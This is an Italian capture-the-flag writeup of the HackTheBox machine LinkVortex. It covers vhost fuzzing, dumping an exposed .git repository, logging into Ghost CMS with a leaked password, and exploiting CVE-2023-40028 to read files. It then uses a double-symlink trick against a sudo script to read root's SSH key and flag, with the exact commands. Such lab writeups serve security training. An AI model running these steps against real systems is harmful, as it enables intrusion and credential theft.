+++
date = '2026-08-05T15:29:21+02:00'
draft = false
title = 'LinkVortex Writeup IT'
+++
**Autore**: **`joy.scd01`**

**Data**: **`26/01/2025`**

![LinkVortex.png](/images/imgs_linkvortex/LinkVortex.png)

---
# Introduzione

**_LinkVortex_** è una macchina **Linux di livello Easy** che evidenzia i rischi legati all'esposizione di directory `.git` e alle bad practice nello scripting bash.

L'accesso iniziale richiede la scoperta di un virtual host e il dumping del suo repository **Git** esposto. Ripristinando le modifiche non committate, ho recuperato delle credenziali per accedere a un'istanza di **Ghost CMS**. La versione del CMS era vulnerabile alla **CVE-2023-40028**, una vulnerabilità di **authenticated arbitrary file read**, che mi ha permesso di leggere il file di configurazione di **Ghost** e ottenere le credenziali **SSH** per un utente.
Infine, la Privilege Escalation coinvolge uno script bash che può essere eseguito come **root** tramite **sudo**. Sfruttando un difetto logico nel modo in cui lo script risolve i link simbolici (**double symlink bypass**) e manipolando una variabile d'ambiente, è stato possibile ingannare lo script facendogli leggere la **root flag**.

---
# Tecniche Utilizzate

- **Enumerazione Virtual Host**
- **Dumping & Ripristino di Repository Git**
- **Ghost CMS Arbitrary File Read (CVE-2023-40028)**
- **Double Symlink Bypass**

---
# Enumerazione

## nmap

Scansione iniziale di tutte le porte:

```bash
nmap -p- linkvortex -T5
```

```text
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

Scansione mirata con script e rilevamento dei servizi:

```bash
nmap -sC -sV linkvortex -T5
```

```text
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 3e:f8:b9:68:c8:eb:57:0f:cb:0b:47:b9:86:50:83:eb (ECDSA)
|_  256 a2:ea:6e:e1:b6:d7:e7:c5:86:69:ce:ba:05:9e:38:13 (ED25519)
80/tcp open  http    Apache httpd
|_http-server-header: Apache
|_http-title: Did not follow redirect to [http://linkvortex.htb/](http://linkvortex.htb/)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Ho aggiunto **`linkvortex.htb`** al mio file **`/etc/hosts`**.

## Enumerazione Web 

![web1.png](/images/imgs_linkvortex/web1.png)

Ho iniziato l'enumerazione delle directory e dei virtual host. Mentre il **directory fuzzing** non ha prodotto grandi risultati, il **virtual host fuzzing** ha rivelato un subdomain:

```bash
ffuf -u [http://linkvortex.htb](http://linkvortex.htb) -H "Host: FUZZ.linkvortex.htb" -w /usr/share/dirbuster/wordlists/directory-list-2.3-small.txt -fs 230
```

![fuzzing.png](/images/imgs_linkvortex/fuzzing.png)

Ho aggiunto **`dev.linkvortex.htb`** al mio file **`/etc/hosts`**.
Navigando su **http://dev.linkvortex.htb** veniva semplicemente mostrata una pagina con un messaggio "**Launching soon**".

![web2.png](/images/imgs_linkvortex/web2.png)

Ho lanciato **Gobuster** sul vhost appena trovato:

```bash
gobuster dir -u [http://dev.linkvortex.htb/](http://dev.linkvortex.htb/) -w /usr/share/seclists/Discovery/Web-Content/common.txt
```

![gob.png](/images/imgs_linkvortex/gob.png)

La scansione ha rilevato una directory **`.git`** esposta.

---
# Accesso Iniziale | Git Dump & Ghost CMS (CVE-2023-40028)

Ho scaricato l'intero repository utilizzando **git-dumper**:

```bash
git clone [https://github.com/arthaud/git-dumper.git](https://github.com/arthaud/git-dumper.git)
python3 -m venv venv && source venv/bin/activate
pip3 install -r requirements.txt
python3 git-dumper.py [http://dev.linkvortex.htb](http://dev.linkvortex.htb) gitdump
```

![git.png](/images/imgs_linkvortex/git.png)

Una volta all'interno della directory **`gitdump`**, ho controllato lo stato del repository e la cronologia dei commit:

```bash
cd gitdump
git status
git show 299cdb4387763f850887275a716153e84793077d
git show dce2e68c9a620e9534f723a94dbb5f33c9e43034
```

L'output di git status ha rivelato alcune modifiche in stage non committate:

```text
Not currently on any branch.
Changes to be committed:
  (use "git restore --staged <file>..." to unstage)
    new file:   Dockerfile.ghost
    modified:   ghost/core/test/regression/api/admin/authentication.test.js 
```

Ho ripristinato i file in stage per visualizzarne il contenuto:

```bash
git restore --staged .
git diff
```

![git2.png](/images/imgs_linkvortex/git2.png)

Ho trovato una password: **OctopiFociPilfer45**. Tuttavia, mi ero inizialmente bloccato perché non avevo un nome utente valido.

Ho cercato online la pagina di login di default di **Ghost CMS** (**`/ghost`**) e ho navigato su **http://linkvortex.htb/ghost**.

**Nota**: _Sul sito principale, ho notato che alcuni post erano stati scritti da **admin**. Nelle macchine **HackTheBox**, è una pratica molto comune costruire gli indirizzi email combinando gli username scoperti con il dominio della macchina. Seguendo questa logica, ho ipotizzato che l'email potesse essere **admin@linkvortex.htb**._

Le credenziali hanno funzionato e ho effettuato il login.

Controllando le impostazioni (**Settings --> About Ghost**), ho trovato la versione: **`5.58.0`**.

![logged.png](/images/imgs_linkvortex/logged.png)

Inizialmente, avevo pensato di sfruttare la feature di "**Code Injection**", ma dopo una rapida ricerca, ho scoperto che questa specifica versione è vulnerabile alla **CVE-2023-40028**.

**Nota**: _Si tratta di una vulnerabilità di **Authenticated Arbitrary File Read**. Il difetto risiede nel modo in cui **Ghost CMS** processa gli upload di immagini o specifici file nei temi. Un attaccante può creare un file malevolo contenente symlink o payload di path traversal che, una volta processati dal backend, permettono di leggere qualsiasi file locale sul server senza aver bisogno di una vera e propria **Remote Code Execution**._

Fatto interessante, la **PoC** che ho trovato è stata scritta da **0xyassine** (il creatore del box **LinkVortex**), il che mi ha confermato di essere sulla strada giusta.

Ho modificato i parametri dell'exploit e l'ho lanciato per leggere l'**`/etc/passwd`**:

```bash
./CVE-2023-40028.sh -u admin@linkvortex.htb -p OctopiFociPilfer45
```

![cve1.png](/images/imgs_linkvortex/cve1.png)

Ho trovato un utente chiamato **node**. Ho tentato di connettermi via **SSH** come quest'ultimo, ma niente.

A questo punto, dal momento che avevo un **arbitrary file read**, ho deciso di cercare file di configurazione. Una rapida ricerca su **Google** ha rivelato che **Ghost** di default salva le configurazioni in:

**`/var/www/ghost/config.production.json` (o in `/var/lib`)**.

Ho utilizzato di nuovo l'exploit per leggere questo file e ho trovato delle credenziali valide:

![config.png](/images/imgs_linkvortex/config.png)

Ho usato queste credenziali per loggarmi via **SSH** e ho preso la **user flag**.

![userf.png](/images/imgs_linkvortex/userf.png)

---
# Privilege Escalation | Sudo Misconfiguration & Symlink Bypass

Ho controllato i privilegi **sudo** usando **`sudo -l`**:

![sudol.png](/images/imgs_linkvortex/sudol.png)

Ho ispezionato lo script per capirne la logica.

**Nota**: _Lo script contiene un difetto logico critico nel modo in cui convalida i symlink. Utilizza **`/usr/bin/readlink $LINK`** per ottenere la destinazione e controlla se contiene le parole **etc** o **root**. Il problema è che **`readlink`** non è ricorsivo (a differenza di **`readlink -f`**). Se creiamo un symlink (**`fall.png`**) che punta a un altro symlink (**`fall.txt`**), il quale a sua volta punta a **`/root/root.txt`**, lo script vedrà solo **`fall.txt`**. Poiché **`fall.txt`** non fa scattare il filtro grep, lo script bypassa il controllo di sicurezza e lo accetta. Inoltre, anteponendo **`CHECK_CONTENT=true`** al comando **sudo**, lo script eseguirà il comando **cat** sul file come **root**._

Ho applicato questo **double symlink bypass** per recuperare prima la **chiave SSH**, passando la variabile d'ambiente per innescare l'esecuzione di **cat**:

```bash
ln -s /root/.ssh/id_rsa fall.txt
ln -s /home/bob/fall.txt fall.png

sudo CHECK_CONTENT=true /usr/bin/bash /opt/ghost/clean_symlink.sh fall.png
```

Ho recuperato la **chiave SSH**, ma il tentativo di connettermi con essa ha restituito un **errore libcrypto** (probabilmente a causa di restrizioni del daemon SSH).

Dato che il metodo ha funzionato perfettamente, ho semplicemente ripetuto lo stesso processo per leggere direttamente la **root flag**:

```bash
rm fall.txt fall.png
ln -s /root/root.txt fall.txt
ln -s /home/bob/fall.txt fall.png

sudo CHECK_CONTENT=true /usr/bin/bash /opt/ghost/clean_symlink.sh fall.png
```

![rootf.png](/images/imgs_linkvortex/rootf.png)

---
# Considerazioni Finali

**_LinkVortex_** è una macchina ben bilanciata.

L'accesso iniziale si basa tutto sui fondamenti dell'enumerazione web: il fuzzing dei virtual host e la ricerca di directory **.git** esposte. L'utilizzo di **git-dumper** e l'analisi delle modifiche non committate è uno scenario estremamente realistico che capita spesso nel pentesting di applicazioni web nel mondo reale.

La fase di Privilege Escalation è sicuramente il pezzo forte. Analizzare lo script bash e sfruttare la natura non ricorsiva di **readlink** attraverso un **double symlink bypass** è un trick molto elegante.

**Fonti**:

- **Git Dumper | https://github.com/arthaud/git-dumper**

- **Ghost CMS Arbitrary File Read (CVE-2023-40028) | https://github.com/0xyassine/CVE-2023-40028**